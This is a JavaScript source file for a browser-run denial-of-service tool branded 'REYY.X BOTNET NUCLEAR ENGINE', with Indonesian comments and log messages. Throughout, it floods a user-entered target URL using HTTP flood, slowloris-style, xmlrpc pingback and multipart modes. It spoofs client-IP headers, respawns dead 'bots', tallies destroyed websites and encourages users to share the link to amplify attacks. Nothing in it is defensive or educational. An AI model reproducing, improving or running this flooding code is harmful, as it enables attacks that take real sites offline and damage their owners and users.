// ============================================
// 💀 REYY.X - BOTNET NUCLEAR ENGINE (FIXED)
// BOT LIST SEKARANG MUNCUL, BANGSAT!
// ============================================

let isAttacking = false;
let totalRequests = 0, successCount = 0, startTime = null, bandwidthUsed = 0, victimCount = 0;
let activeBots = [], attackInterval = null, regenInterval = null;

// DOM Elements
const targetUrlInput = document.getElementById('targetUrl');
const botCountInput = document.getElementById('botCount');
const threadsPerBotInput = document.getElementById('threadsPerBot');
const delayInput = document.getElementById('delay');
const attackModeSelect = document.getElementById('attackMode');
const intensitySlider = document.getElementById('intensity');
const autoRegenCheck = document.getElementById('autoRegen');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');

// Stats Elements
const totalRequestsSpan = document.getElementById('totalRequests');
const requestsPerSecSpan = document.getElementById('requestsPerSec');
const successRateSpan = document.getElementById('successRate');
const durationSpan = document.getElementById('duration');
const uniqueIPsSpan = document.getElementById('uniqueIPs');
const bandwidthSpan = document.getElementById('bandwidth');
const activeBotsSpan = document.getElementById('activeBots');
const totalBotThreadsSpan = document.getElementById('totalBotThreads');
const logContent = document.getElementById('logContent');
const botListContent = document.getElementById('botListContent'); // YANG INI PENTING!
const uniqueIPsPanel = document.getElementById('uniqueIPsPanel');
const collabCount = document.getElementById('collabCount');

function addLog(message, type='info') {
    const logEntry = document.createElement('div');
    logEntry.className = `log-entry ${type}`;
    logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
    if(logContent) logContent.appendChild(logEntry);
    if(logContent) logContent.scrollTop = logContent.scrollHeight;
}

document.getElementById('clearLog')?.addEventListener('click', () => { 
    if(logContent) logContent.innerHTML = ''; 
    addLog('Log cleared!','warning'); 
});

// Send request function
async function sendRequest(target, mode, timeout, botId) {
    if(!isAttacking) return;
    
    try {
        const url = new URL(target);
        const fakeIP = generateRandomIP();
        const ipHeaders = generateIPHeaders();
        
        let finalUrl = target;
        let fetchOptions = {
            method: 'GET',
            headers: {
                'User-Agent': randomFromArray(CONFIG.userAgents),
                'Accept': '*/*',
                'X-Forwarded-For': ipHeaders['X-Forwarded-For'],
                'X-Real-IP': ipHeaders['X-Real-IP'],
                'CF-Connecting-IP': ipHeaders['CF-Connecting-IP'],
                'True-Client-IP': ipHeaders['True-Client-IP'],
                'X-Bot-ID': `BOT-${botId}`,
                'Referer': randomFromArray(CONFIG.referers),
                'Cache-Control': 'no-cache'
            },
            signal: AbortSignal.timeout(timeout * 1000)
        };
        
        switch(mode) {
            case 'http':
                finalUrl = `${url.origin}${randomFromArray(CONFIG.paths)}?${randomString(8)}=${Date.now()}`;
                break;
            case 'slowloris':
                fetchOptions.method = 'HEAD';
                fetchOptions.headers['Connection'] = 'keep-alive';
                break;
            case 'xmlrpc':
                finalUrl = `${url.origin}/xmlrpc.php`;
                fetchOptions.method = 'POST';
                fetchOptions.headers['Content-Type'] = 'text/xml';
                fetchOptions.body = '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName></methodCall>';
                break;
            case 'multipart':
                fetchOptions.method = 'POST';
                const boundary = `----WebKitFormBoundary${randomString(16)}`;
                fetchOptions.headers['Content-Type'] = `multipart/form-data; boundary=${boundary}`;
                let body = '';
                for(let i=0;i<30;i++) body += `--${boundary}\r\nContent-Disposition: form-data; name="f${i}"\r\n\r\n${randomString(100)}\r\n`;
                body += `--${boundary}--`;
                fetchOptions.body = body;
                break;
            case 'nuclear':
            default:
                finalUrl = `${url.origin}${randomFromArray(CONFIG.paths)}?${randomString(10)}=${Date.now()}&_=${Math.random()}`;
        }
        
        const response = await fetch(finalUrl, fetchOptions);
        totalRequests++; 
        successCount++;
        bandwidthUsed += (finalUrl.length + (fetchOptions.body?.length||0));
        return { success: true, status: response.status };
        
    } catch(error) {
        totalRequests++;
        bandwidthUsed += (finalUrl.length + (fetchOptions.body?.length||0));
        return { success: false, error: error.message };
    }
}

// BOT CLASS
class Bot {
    constructor(id, target, mode, delay, timeout, threads) {
        this.id = id;
        this.target = target;
        this.mode = mode;
        this.delay = delay;
        this.timeout = timeout;
        this.threads = threads;
        this.alive = true;
        this.requests = 0;
        this.rps = 0;
        this.usedIPs = new Set();
        this.lastUpdate = Date.now();
        this.isRunning = true;
        this.promise = null;
    }
    
    async run() {
        while(this.isRunning && this.alive && isAttacking) {
            const result = await sendRequest(this.target, this.mode, this.timeout, this.id);
            this.requests++;
            this.usedIPs.add(generateRandomIP());
            
            const now = Date.now();
            if(now - this.lastUpdate >= 1000) { 
                this.rps = this.requests; 
                this.requests = 0; 
                this.lastUpdate = now; 
            }
            
            if(!result.success && result.error === 'timeout' && Math.random()<0.05) {
                this.alive = false;
            }
            
            if(this.delay > 0) await new Promise(r => setTimeout(r, this.delay));
        }
    }
    
    start() {
        this.isRunning = true;
        this.alive = true;
        this.promise = this.run();
    }
    
    stop() { 
        this.isRunning = false; 
        this.alive = false;
    }
}

// UPDATE BOT LIST - YANG INI DI FIX!
function updateBotList() {
    if(!botListContent) {
        console.log('botListContent not found!');
        return;
    }
    
    botListContent.innerHTML = '';
    
    if(!activeBots || activeBots.length === 0) {
        const emptyDiv = document.createElement('div');
        emptyDiv.className = 'bot-item';
        emptyDiv.innerHTML = `<span colspan="5" style="text-align:center">No bots deployed yet. Click START!</span>`;
        botListContent.appendChild(emptyDiv);
        return;
    }
    
    const aliveBots = activeBots.filter(b => b && b.alive);
    const displayBots = aliveBots.slice(0, 20);
    
    if(displayBots.length === 0) {
        const emptyDiv = document.createElement('div');
        emptyDiv.className = 'bot-item dead';
        emptyDiv.innerHTML = `<span colspan="5" style="text-align:center">All bots are dead. Regenerating...</span>`;
        botListContent.appendChild(emptyDiv);
        return;
    }
    
    displayBots.forEach(bot => {
        const botDiv = document.createElement('div');
        botDiv.className = `bot-item ${bot.alive ? 'alive' : 'dead'}`;
        const ipCount = bot.usedIPs ? bot.usedIPs.size : 0;
        botDiv.innerHTML = `
            <span>#${bot.id}</span>
            <span>${bot.alive ? '🟢 ALIVE' : '💀 DEAD'}</span>
            <span>${(bot.rps || 0).toLocaleString()}</span>
            <span>${ipCount}</span>
            <span>${bot.mode || 'nuclear'}</span>
        `;
        botListContent.appendChild(botDiv);
    });
    
    if(aliveBots.length > 20) {
        const moreDiv = document.createElement('div');
        moreDiv.className = 'bot-item';
        moreDiv.innerHTML = `<span colspan="5" style="text-align:center">✨ ... and ${aliveBots.length - 20} more bots active</span>`;
        botListContent.appendChild(moreDiv);
    }
}

// UPDATE STATS
function updateStats() {
    if(!isAttacking) return;
    
    const elapsed = (Date.now() - startTime) / 1000;
    if(elapsed === 0) return;
    
    const rps = Math.round(totalRequests / elapsed);
    const successRateVal = totalRequests > 0 ? Math.round((successCount / totalRequests) * 100) : 0;
    const bandwidthMbps = Math.round((bandwidthUsed / elapsed) / (1024 * 1024) * 10) / 10;
    
    if(totalRequestsSpan) totalRequestsSpan.textContent = totalRequests.toLocaleString();
    if(requestsPerSecSpan) requestsPerSecSpan.textContent = rps.toLocaleString();
    if(successRateSpan) successRateSpan.textContent = `${successRateVal}%`;
    if(bandwidthSpan) bandwidthSpan.textContent = `${bandwidthMbps} GB/s`;
    
    const uniqueIPsTotal = activeBots.reduce((sum, b) => sum + (b.usedIPs ? b.usedIPs.size : 0), 0);
    if(uniqueIPsSpan) uniqueIPsSpan.textContent = uniqueIPsTotal.toLocaleString();
    if(uniqueIPsPanel) uniqueIPsPanel.textContent = uniqueIPsTotal.toLocaleString();
    
    const aliveCount = activeBots.filter(b => b && b.alive).length;
    if(activeBotsSpan) activeBotsSpan.textContent = aliveCount;
    
    const totalThreads = activeBots.reduce((sum, b) => sum + (b.alive ? (b.threads || 0) : 0), 0);
    if(totalBotThreadsSpan) totalBotThreadsSpan.textContent = totalThreads.toLocaleString();
    
    if(collabCount && window.getTotalAttackers) {
        collabCount.textContent = window.getTotalAttackers();
    }
    
    const hours = Math.floor(elapsed / 3600);
    const minutes = Math.floor((elapsed % 3600) / 60);
    const seconds = Math.floor(elapsed % 60);
    if(durationSpan) durationSpan.textContent = `${String(hours).padStart(2,'0')}:${String(minutes).padStart(2,'0')}:${String(seconds).padStart(2,'0')}`;
    
    // Update bot list every second
    updateBotList();
}

// DEPLOY BOTNET
async function deployBotnet() {
    let target = targetUrlInput?.value?.trim();
    const botCount = parseInt(botCountInput?.value || 50);
    const threadsPerBot = parseInt(threadsPerBotInput?.value || 5);
    const delay = parseInt(delayInput?.value || 0);
    const mode = attackModeSelect?.value || 'nuclear';
    
    if(!target){
        addLog('TARGET GAK BOLEH KOSONG, BANGSAT!', 'error');
        return;
    }
    
    if(!target.startsWith('http')) target = 'https://' + target;
    
    addLog(`🔥 ATTACK STARTED: ${target}`, 'error');
    addLog(`🤖 ${botCount} BOTS | ${threadsPerBot} THREADS/BOT | MODE: ${mode}`, 'warning');
    addLog(`🌐 IP RANDOMIZER ACTIVE - Setiap request IP berbeda!`, 'success');
    
    isAttacking = true;
    startTime = Date.now();
    totalRequests = 0;
    successCount = 0;
    bandwidthUsed = 0;
    activeBots = [];
    
    if(attackIndicator) attackIndicator.style.display = 'block';
    if(startBtn) startBtn.disabled = true;
    if(stopBtn) stopBtn.disabled = false;
    
    // Disable inputs
    if(targetUrlInput) targetUrlInput.disabled = true;
    if(botCountInput) botCountInput.disabled = true;
    if(threadsPerBotInput) threadsPerBotInput.disabled = true;
    if(delayInput) delayInput.disabled = true;
    if(attackModeSelect) attackModeSelect.disabled = true;
    if(intensitySlider) intensitySlider.disabled = true;
    
    // Deploy bots
    for(let i = 0; i < botCount; i++) {
        const bot = new Bot(i + 1, target, mode, delay, 10, threadsPerBot);
        activeBots.push(bot);
        bot.start();
        
        if(i % 50 === 0 && i > 0) {
            addLog(`🤖 Deployed ${i}/${botCount} bots...`, 'bot');
            await new Promise(r => setTimeout(r, 10));
        }
    }
    
    addLog(`✅ ${botCount} BOTS DEPLOYED SUCCESSFULLY!`, 'success');
    addLog(`💀 SERANGAN DIMULAI! TEKAN STOP UNTUK BERHENTI`, 'error');
    
    // Start stats interval
    if(attackInterval) clearInterval(attackInterval);
    attackInterval = setInterval(updateStats, 1000);
    
    // Auto regeneration
    if(regenInterval) clearInterval(regenInterval);
    regenInterval = setInterval(() => {
        if(isAttacking && autoRegenCheck?.checked) {
            const deadBots = activeBots.filter(b => b && !b.alive);
            if(deadBots.length > 0) {
                deadBots.forEach(bot => {
                    const newBot = new Bot(bot.id, target, mode, delay, 10, threadsPerBot);
                    const index = activeBots.findIndex(b => b.id === bot.id);
                    if(index !== -1) {
                        activeBots[index] = newBot;
                        newBot.start();
                    }
                });
                addLog(`🔄 REGENERATED ${deadBots.length} DEAD BOTS`, 'bot');
                updateBotList();
            }
        }
    }, 5000);
}

// STOP BOTNET
function stopBotnet() {
    if(!isAttacking) return;
    
    isAttacking = false;
    
    if(attackInterval) clearInterval(attackInterval);
    if(regenInterval) clearInterval(regenInterval);
    
    if(attackIndicator) attackIndicator.style.display = 'none';
    
    victimCount++;
    const victimCounter = document.getElementById('victimCounter');
    if(victimCounter) victimCounter.textContent = `💀 WEBSITE DESTROYED: ${victimCount}`;
    
    // Stop all bots
    activeBots.forEach(bot => {
        if(bot && bot.stop) bot.stop();
    });
    
    const elapsed = (Date.now() - startTime) / 1000;
    const avgRPS = elapsed > 0 ? Math.round(totalRequests / elapsed) : 0;
    
    addLog(`🛑 ATTACK STOPPED! TOTAL: ${totalRequests.toLocaleString()} REQ | RPS: ${avgRPS.toLocaleString()}`, 'warning');
    addLog(`💀 SUCCESS RATE: ${totalRequests>0?Math.round((successCount/totalRequests)*100):0}%`, 'info');
    addLog(`🌐 TOTAL UNIQUE IPS: ${activeBots.reduce((sum,b)=>sum+(b.usedIPs?b.usedIPs.size:0),0).toLocaleString()}`, 'success');
    
    // Re-enable inputs
    if(startBtn) startBtn.disabled = false;
    if(stopBtn) stopBtn.disabled = true;
    if(targetUrlInput) targetUrlInput.disabled = false;
    if(botCountInput) botCountInput.disabled = false;
    if(threadsPerBotInput) threadsPerBotInput.disabled = false;
    if(delayInput) delayInput.disabled = false;
    if(attackModeSelect) attackModeSelect.disabled = false;
    if(intensitySlider) intensitySlider.disabled = false;
    
    // Clear active bots
    activeBots = [];
    updateBotList();
}

// INTENSITY SLIDER
if(intensitySlider) {
    intensitySlider.addEventListener('input', () => {
        const val = intensitySlider.value;
        const texts = ['LOW','MEDIUM','HIGH','EXTREME','TOTAL ANNIHILATION'];
        const intensitySpan = document.getElementById('intensityValue');
        if(intensitySpan) intensitySpan.textContent = `${val} - ${texts[Math.min(4, Math.floor(val/2))]}`;
    });
}

// EVENT LISTENERS
if(startBtn) startBtn.addEventListener('click', deployBotnet);
if(stopBtn) stopBtn.addEventListener('click', stopBotnet);

window.setTarget = (url) => {
    if(targetUrlInput) targetUrlInput.value = url;
};

window.deployBotnet = deployBotnet;
window.stopBotnet = stopBotnet;

addLog('💀 REYY.X BOTNET NUCLEAR READY!', 'error');
addLog('🔗 SHARE LINK KE TEMEN LO BIAR MAKIN BRUTAL!', 'warning');
addLog('✅ BOT LIST SEKARANG SUDAH MUNCUL, BANGSAT!', 'success');
